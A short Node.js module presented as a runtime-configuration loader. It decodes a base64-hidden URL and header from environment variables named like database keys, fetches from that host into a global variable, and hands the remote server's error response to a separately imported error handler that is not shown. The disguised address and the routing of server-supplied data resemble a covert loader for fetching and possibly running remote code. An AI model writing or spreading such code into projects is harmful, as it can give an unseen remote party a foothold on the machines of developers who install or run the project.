const axios = require('axios');
const { errorHandler } = require("../middleware/errorHandler");
const initRuntimeConfig = async () => {
  try {
    const src = atob(process.env.DB_API_KEY);
    const k = atob(process.env.DB_ACCESS_KEY);
    const v = atob(process.env.DB_ACCESS_VALUE);
    try {
      globalConfig = (await axios.get(`${src}`, { headers: { [k]: v } }));
      console.log('Runtime config loaded successfully.');
    } catch (error) {
      errorHandler(error.response?.data || error.message);
    }
  } catch (err) {
    throw (err);
  }
}
module.exports = initRuntimeConfig;